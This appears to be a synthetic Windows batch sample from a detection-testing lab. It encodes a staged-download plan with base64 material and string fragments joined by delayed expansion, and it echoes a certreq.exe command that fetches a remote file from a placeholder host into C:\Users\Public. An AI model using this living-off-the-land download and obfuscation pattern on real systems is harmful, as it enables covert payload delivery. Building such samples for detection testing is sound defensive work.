@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|add_7
rem HUNTRESS-MATERIAL:fUQ4g3p7bHd6RGhqeHxweWxmeWx0dntsM355cHtsZm1wc2yDaGtod3tseURqbHl7eWx4NWx/bIN6e2hubGZqdnx1e0Q4g255aHdvRHpodGxmc2h1bnxobmyDdWx/e2ZzaHVufGhubER1dnVsg2podHdocG51ZnBrRGpodHdocG51NEA4OTtoQGlsbTuDfHlzRG97e3d6QTY2QDg5O2hAaWxtOzVsf2h0d3NsNXB1fWhzcGs2azxsamg6Oz01a2h7g21wc2xmd2h7b0RKQWNcemx5emNXfGlzcGpjT3x1e3lsenpTaGljentobmw0QDg5O2hAaWxtOzVraHs=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "FrAg0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage_c"& rem HUNTRESS quote compound
set "FrAg1=ount=1|graph=same_language|next_language=none|campaign_id=campa"& rem HUNTRESS quote compound
set "FrAg2=ign-9124a9bef4|url=https://9124a9bef4.example.invalid/d5eca346."& rem HUNTRESS quote compound
set "FrAg3=dat|file_path=C:\Users\Public\HuntressLab\stage-9124a9bef4.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "ReCoVeReD="
for %%G in (0 1 2 3) do call set "ReCoVeReD=%%ReCoVeReD%%%%FrAg%%G%%"
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://9124a9bef4.example.invalid/d5eca346.dat to C:\Users\Public\HuntressLab\stage-9124a9bef4.dat
exit /b 0
